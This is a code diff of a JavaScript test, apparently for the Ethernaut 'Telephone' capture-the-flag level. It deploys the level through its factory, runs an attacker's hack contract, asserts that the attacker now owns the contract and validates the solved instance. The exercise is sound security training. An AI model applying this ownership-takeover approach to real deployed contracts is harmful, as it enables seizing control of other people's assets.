@@ -6,17 +6,26 @@ describe("Telephone exploit", () => {
   async function deployTelephoneFixture() {
     const [deployer, attacker] = await ethers.getSigners();
 
-    const Telephone = await ethers.getContractFactory("Telephone");
-    const telephone = await Telephone.connect(deployer).deploy();
+    const TelephoneFactory = await ethers.getContractFactory("TelephoneFactory");
+    const telephoneFactory = await TelephoneFactory.connect(deployer).deploy();
+
+    // Simulate execution of createInstance to get return value of the function(address of deployed instance)
+    const telephoneAddress = await telephoneFactory.callStatic.createInstance(attacker.address);
+
+    const tx = await telephoneFactory.createInstance(attacker.address);
+    await tx.wait();
+
+    // Load the instance at returned address
+    const telephone = await ethers.getContractAt("Telephone", telephoneAddress);
 
     const TelephoneHack = await ethers.getContractFactory("TelephoneHack");
     const telephoneHack = await TelephoneHack.connect(attacker).deploy(telephone.address);
 
-    return { attacker, telephone, telephoneHack };
+    return { attacker, telephone, telephoneFactory, telephoneHack };
   }
 
   it("Changes the owner to attacker", async () => {
-    const { attacker, telephone, telephoneHack } = await loadFixture(deployTelephoneFixture);
+    const { attacker, telephone, telephoneFactory, telephoneHack } = await loadFixture(deployTelephoneFixture);
 
     const tx = await telephoneHack.connect(attacker).changeOwner(attacker.address);
     await tx.wait();
@@ -25,5 +34,9 @@ describe("Telephone exploit", () => {
 
     // Assert the new owner
     expect(attacker.address).to.be.equal(ownerAfterHack, "The New Owner Is Not Set ");
+
+    // Validate instance using Ethernaut validation
+    const success = await telephoneFactory.validateInstance(telephone.address, attacker.address);
+    expect(success).to.be.true;
   });
 });
